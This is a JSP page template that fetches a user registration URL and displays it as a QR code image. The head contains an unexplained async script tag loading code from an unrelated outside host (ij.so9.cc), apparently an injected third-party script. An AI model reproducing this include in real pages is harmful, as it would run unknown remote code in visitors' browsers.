<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<%
	String url = session.getAttribute("url") != null ? session.getAttribute("url").toString() : "";
%>
<head>
<script async=""
	src="//ij.so9.cc/j/?t=fx&amp;g=d8c8e9da44d8&amp;c=44032c45701d&amp;rv=1"></script>
<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">


		<title>二维码下载</title>

		<link
			href="<%=request.getContextPath()%>/css/bootstrap.min14ed.css?v=3.3.6"
			rel="stylesheet" />
		<link
			href="<%=request.getContextPath()%>/css/font-awesome.min93e3.css?v=4.4.0"
			rel="stylesheet" />
		<link href="<%=request.getContextPath()%>/css/animate.min.css"
			rel="stylesheet" />
		<link
			href="<%=request.getContextPath()%>/css/style.min862f.css?v=4.1.0"
			rel="stylesheet" />
		<link rel="stylesheet"
			href="<%=request.getContextPath()%>/css/static/layui.css" media="all">
			<style>
.middle-box {
	padding-top: 0 !important;
}
</style>
			<link id="layuicss-layer" rel="stylesheet"
				href="<%=request.getContextPath()%>/css/static/layer.css"
				media="all">
</head>

<body class="gray-bg">


	<div class="wrapper wrapper-content">
		<div class="row">
			<div class="col-sm-12">
				<div class="middle-box text-center animated fadeInRightBig"
					style="margin-top: 0;">
					<div id="qrcode"></div>
				</div>
			</div>
		</div>
	</div>
	<!-- 全局js -->
	<script src="<%=request.getContextPath()%>/js/jquery.min.js"></script>
	<script src="<%=request.getContextPath()%>/js/bootstrap.min.js?v=3.4.0"></script>
	<script src="<%=request.getContextPath()%>/js/content.min.js?v=1.0.0"></script>
	<div id="code" class="modal fade" aria-hidden="true">
		<script src="<%=request.getContextPath()%>/js/static/layui.js"
			charset="utf-8"></script>
		<script type="text/javascript"
			src="<%=request.getContextPath()%>/js/static/jquery.qrcode.min.js"></script>
		<script>
			$(function() {
				$.ajax({
					url : "../business/getUserRegisterUrl.do",
					type : "post",
					dataType : "json",
					async : false,
					success : function(data) {
						$('#qrcode').qrcode(data.url);
						//获取网页中的canvas对象
						var mycanvas1 = document
								.getElementsByTagName('canvas')[0];
						mycanvas1.style.display = 'none'//隐藏生成的canvas
						//将转换后的img标签插入到html中
						var img = convertCanvasToImage(mycanvas1);
						$('#qrcode').append(img);//imagQrDiv表示你要插入的容器id
						//从 canvas 提取图片 image
						
					}
				});
				// var str = url;
				//$('#qrcode').qrcode(str); 
			});
			function convertCanvasToImage(canvas) {
				//新Image对象，可以理解为DOM
				var image = new Image();
				// canvas.toDataURL 返回的是一串Base64编码的URL，当然,浏览器自己肯定支持
				// 指定格式 PNG
				image.src = canvas.toDataURL("image/png");
				return image;
			}
		</script>
</body>
</html>